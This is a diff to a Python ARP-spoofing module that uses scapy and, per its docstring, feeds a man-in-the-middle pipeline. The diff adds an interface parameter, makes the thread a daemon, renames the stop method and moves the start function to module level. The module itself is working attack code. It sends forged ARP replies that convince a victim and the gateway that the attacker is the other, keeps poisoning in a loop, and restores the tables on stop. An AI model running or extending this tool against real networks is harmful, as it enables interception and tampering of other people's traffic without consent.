@@ -6,7 +6,6 @@ import threading
 from scapy.all import ARP, send
 
 from src.core.network import get_mac_for_ip
-from src.core.config import load_config
 
 class ARPSpoofer(threading.Thread):
     """
@@ -14,8 +13,9 @@ class ARPSpoofer(threading.Thread):
     It tells the Victim that the Gateway is the Attacker, and vice-versa.
     """
 
-    def __init__(self, target_ip: str, gateway_ip: str):
+    def __init__(self, target_ip: str, gateway_ip: str, interface: str = None):
         super().__init__()
+        self.daemon = True
         
         # Stop the thread gracefully
         self._stop_event = threading.Event()
@@ -23,10 +23,9 @@ class ARPSpoofer(threading.Thread):
         # Target IPs
         self.target_ip = target_ip     
         self.gateway_ip = gateway_ip   
-        self.interface = None 
         
-        self.target_mac = get_mac_for_ip(self.target_ip, self.interface)
-        self.gateway_mac = get_mac_for_ip(self.gateway_ip, self.interface)
+        self.target_mac = get_mac_for_ip(self.target_ip, interface)
+        self.gateway_mac = get_mac_for_ip(self.gateway_ip, interface)
         
         if not self.target_mac or not self.gateway_mac:
             raise Exception("Failed to resolve necessary MAC addresses. Check network connectivity.")
@@ -42,6 +41,7 @@ class ARPSpoofer(threading.Thread):
         # ARP response/reply
         packet = ARP(op=2, pdst=pdst, hwdst=hwdst, psrc=psrc)
         return packet
+
     def run(self):
         """The main loop that runs in a separate thread, sending persistent spoofs."""
         print("[INFO] ARP Spoofing thread started (poisoning started).")
@@ -74,12 +74,11 @@ class ARPSpoofer(threading.Thread):
         print("[INFO] ARP Spoofing thread finished.")
 
 
-    def stop_arp_spoof(self):
+    def stop(self):
         """Signals the thread to stop and restores the ARP tables."""
         print("[INFO] Signaling ARP Spoofing thread to stop...")
         self._stop_event.set() 
-        self._restore_arp()    
-        pass
+        self._restore_arp()
 
     def _restore_arp(self):
         """Sends legitimate ARP response packets to restore original mappings."""
@@ -109,18 +108,14 @@ class ARPSpoofer(threading.Thread):
             send(gateway_restore_packet, verbose=False)
             time.sleep(0.5)
 
-    def start_arp_spoof(target_ip: str, gateway_ip: str) -> ARPSpoofer | None:
-        """
-        The main entry point function called from mitm_pipeline.py.
-        """
-        try:
-            spoofer = ARPSpoofer(target_ip, gateway_ip)
-            spoofer.start()
-            return spoofer
-        except Exception as e:
-            print(f"[CRITICAL ERROR] Failed to start ARPSpoofer: {e}")
-            return None
-        
-        pass
-        
-    pass
+def start_arp_spoof(target_ip: str, gateway_ip: str) -> ARPSpoofer | None:
+    """
+    The main entry point function called from mitm_pipeline.py.
+    """
+    try:
+        spoofer = ARPSpoofer(target_ip, gateway_ip)
+        spoofer.start()
+        return spoofer
+    except Exception as e:
+        print(f"[CRITICAL ERROR] Failed to start ARPSpoofer: {e}")
+        return None
